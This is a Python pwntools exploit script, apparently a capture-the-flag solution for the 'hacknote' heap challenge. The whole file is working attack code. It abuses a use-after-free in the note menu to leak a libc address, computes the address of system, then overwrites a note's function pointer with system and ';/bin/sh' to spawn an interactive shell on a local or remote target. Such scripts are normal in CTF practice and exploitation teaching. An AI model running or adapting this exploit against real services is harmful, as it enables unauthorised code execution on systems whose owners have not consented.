#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

gdb_bool = True
context.m_gdb = "peda"
context.log_level = 'debug'
#gdb_bool = False


def add_note(size,content):
    r.recvuntil("Your choice :")
    r.sendline("1")
    r.sendlineafter("size :",str(size))
    r.sendlineafter("Content :",str(content))
    

def delete_note(idx):
    r.recvuntil("Your choice :")
    r.sendline("2")
    r.sendlineafter("Index :",str(idx))

def print_note(idx):
    r.recvuntil("Your choice :")
    r.sendline("3")
    r.sendlineafter("Index :",str(idx))
    r.recvn(4)
    dump = u32(r.recvn(4))
    return dump

def exit():
    r.sendline("4")

def exploit(r):
    #0x804a050 where pointers are stored to heap
    #[addr to puts][addr of contents][00000000][size]
    #[contents]

    #r.recvuntil(":")
    add_note(0x90,"A") #0
    add_note(0x90,"B") #1
    delete_note(0)
    delete_note(1)
    add_note(0x90,"C")
    leak = print_note(2)
    log.info("libc leak %s"%hex(leak))


    libc_base = leak - 0x1b0850
    system = libc_base +0x3a940
    log.info("system add : %s",hex(system))

    delete_note(2)
    add_note(0x20,p32(system)+";/bin/sh\x00")
    print_note(0)




    



    
    #printNote(0)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./hacknote"        #put binary name here
    e = ELF(binary_name)
    libc = ELF("libc_32.so.6")

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name,env={"LD_PRELOAD" : "./libc_32.so.6"})
        #print util.proc.pidof(r)
        gdb_cmd = [
            
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)
